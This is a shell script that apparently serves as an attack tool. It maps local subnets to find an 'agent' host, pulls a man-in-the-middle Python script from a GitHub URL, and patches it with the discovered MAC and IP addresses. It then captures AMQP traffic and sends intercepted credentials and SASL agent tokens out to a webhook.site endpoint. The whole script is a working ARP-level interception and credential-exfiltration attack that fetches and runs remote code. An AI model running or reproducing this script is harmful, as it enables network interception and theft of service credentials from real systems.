#!/bin/sh
set -e
LOG=/tmp/attacker.log
exec > "$LOG" 2>&1

apk add --no-cache curl tcpdump iproute2 python3 nmap >/dev/null 2>&1

echo "=== ip link ==="
ip link
echo "=== ip addr ==="
ip addr
echo "=== ip route ==="
ip route
GW=$(ip route | awk '/default/{print $3; exit}')
OUR_IFACE=$(ip route | awk '/default/{print $5; exit}')
OUR_IP=$(ip -4 addr show "$OUR_IFACE" | awk '/inet /{print $2}' | cut -d/ -f1)
OUR_NET=$(echo "$OUR_IP" | sed 's/\.[0-9]*$//')

echo "OUR_IP=$OUR_IP OUR_NET=$OUR_NET GW=$GW IFACE=$OUR_IFACE"

ping -c 2 -W 1 "$GW" >/dev/null 2>/dev/null || true

echo "=== scanning our subnet $OUR_NET.0/24 ==="
for i in 1 2 3 4 5 6 7 8 9 10; do
  ping -c 1 -W 1 "${OUR_NET}.${i}" >/dev/null 2>/dev/null &
done
wait

echo "=== also scan 172.17-20 ==="
for net in 172.17.0 172.18.0 172.19.0 172.20.0; do
  for i in 1 2 3 4 5; do
    ping -c 1 -W 1 "${net}.${i}" >/dev/null 2>/dev/null &
  done
done
wait

sleep 2
ip neigh > /tmp/neigh.txt
echo "=== neighbors ==="
cat /tmp/neigh.txt

OUR_MAC=$(ip link show "$OUR_IFACE" | awk '/link\/ether/{print $2}' | tr -d ':')
GW_MAC=$(ip neigh show "$GW" | awk '{print $5}' | head -1 | tr -d ':')

AGENT_IP=""
AGENT_MAC=""
while read line; do
  ip_addr=$(echo "$line" | awk '{print $1}')
  mac=$(echo "$line" | awk '{print $5}')
  state=$(echo "$line" | awk '{print $NF}')
  [ "$ip_addr" = "$GW" ] && continue
  [ -z "$mac" ] && continue
  mac_clean=$(echo "$mac" | tr -d ':')
  [ "$mac_clean" = "$OUR_MAC" ] && continue
  case "$state" in
    REACHABLE|STALE|DELAY|PROBE)
      AGENT_IP="$ip_addr"
      AGENT_MAC="$mac_clean"
      echo "Found potential agent: $AGENT_IP mac=$AGENT_MAC"
      ;;
  esac
done < /tmp/neigh.txt

echo "IFACE=$OUR_IFACE OUR_MAC=$OUR_MAC GW=$GW GW_MAC=$GW_MAC AGENT_IP=$AGENT_IP AGENT_MAC=$AGENT_MAC"

# If still no agent, try nmap on our subnet
if [ -z "$AGENT_IP" ]; then
  echo "=== nmap scan ==="
  nmap -sn -n "${OUR_NET}.0/24" -oG /tmp/nmap.txt 2>/dev/null || true
  cat /tmp/nmap.txt 2>/dev/null
  ip neigh > /tmp/neigh2.txt
  echo "=== neighbors after nmap ==="
  cat /tmp/neigh2.txt
  while read line; do
    ip_addr=$(echo "$line" | awk '{print $1}')
    mac=$(echo "$line" | awk '{print $5}')
    state=$(echo "$line" | awk '{print $NF}')
    [ "$ip_addr" = "$GW" ] && continue
    [ "$ip_addr" = "$OUR_IP" ] && continue
    [ -z "$mac" ] && continue
    mac_clean=$(echo "$mac" | tr -d ':')
    [ "$mac_clean" = "$OUR_MAC" ] && continue
    case "$state" in
      REACHABLE|STALE|DELAY|PROBE|FAILED)
        if [ -z "$AGENT_IP" ]; then
          AGENT_IP="$ip_addr"
          AGENT_MAC="$mac_clean"
          echo "Found agent after nmap: $AGENT_IP mac=$AGENT_MAC"
        fi
        ;;
    esac
  done < /tmp/neigh2.txt
fi

if [ -z "$AGENT_IP" ] || [ -z "$AGENT_MAC" ] || [ -z "$GW_MAC" ]; then
  echo "ERROR: could not find agent or gateway MAC"
  {
    echo "=== RECON FAILED ==="
    echo "OUR_IP=$OUR_IP OUR_NET=$OUR_NET OUR_IFACE=$OUR_IFACE OUR_MAC=$OUR_MAC"
    echo "GW=$GW GW_MAC=$GW_MAC"
    echo "AGENT_IP=$AGENT_IP AGENT_MAC=$AGENT_MAC"
    echo "=== neigh ==="
    cat /tmp/neigh.txt
    cat /tmp/neigh2.txt 2>/dev/null
    echo "=== nmap ==="
    cat /tmp/nmap.txt 2>/dev/null
    echo "=== ip route ==="
    ip route
  } | curl -sS --max-time 20 --data-binary @- "https://webhook.site/2d6eb676-d74f-4b42-a459-21b879ae64b6?tag=L1-RECON-FAIL-V2"
  sleep 999999
  exit 1
fi

curl -sS -o /tmp/mitm.py "https://raw.githubusercontent.com/sashabal/f23-poc/f23-test-root/mitm_rst_v9.py"

sed -i \
  -e "s|IFACE = \"eth1\"|IFACE = \"$OUR_IFACE\"|" \
  -e "s|OUR_MAC = bytes.fromhex(\"369822861110\")|OUR_MAC = bytes.fromhex(\"$OUR_MAC\")|" \
  -e "s|AGENT_MAC = bytes.fromhex(\"9af0af4b510f\")|AGENT_MAC = bytes.fromhex(\"$AGENT_MAC\")|" \
  -e "s|GW_MAC = bytes.fromhex(\"8a2a3548b779\")|GW_MAC = bytes.fromhex(\"$GW_MAC\")|" \
  -e "s|GW_IP = \"172.18.0.1\"|GW_IP = \"$GW\"|" \
  /tmp/mitm.py

sed -i "s|AGENT_IPS = \[\"172.17.0.2\", \"172.18.0.2\"\]|AGENT_IPS = [\"$AGENT_IP\"]|" /tmp/mitm.py

echo "=== Starting MITM ==="
python3 /tmp/mitm.py &
MITM_PID=$!

tcpdump -i "$OUR_IFACE" -w /tmp/cap.pcap -c 500 host 188.225.85.94 and port 5672 2>/dev/null &
TCPDUMP_PID=$!

sleep 120
kill $MITM_PID 2>/dev/null || true
kill $TCPDUMP_PID 2>/dev/null || true
sleep 2

{
  echo "=== recon ==="
  echo "IFACE=$OUR_IFACE OUR_MAC=$OUR_MAC GW=$GW GW_MAC=$GW_MAC AGENT_IP=$AGENT_IP AGENT_MAC=$AGENT_MAC"
  echo "=== neigh ==="
  cat /tmp/neigh.txt
  echo "=== mitm results ==="
  cat /tmp/mitm_results.txt 2>/dev/null || echo "no results"
  echo "=== amqp creds ==="
  cat /tmp/amqp_creds.txt 2>/dev/null || echo "no creds"
  echo "=== SASL strings from pcap ==="
  strings /tmp/cap.pcap 2>/dev/null | grep -aE "agent_[a-f0-9-]{36}" | head -5 || echo "no sasl strings"
} | curl -sS --max-time 20 --data-binary @- "https://webhook.site/2d6eb676-d74f-4b42-a459-21b879ae64b6?tag=L1-MITM-RESULT"

sleep 999999
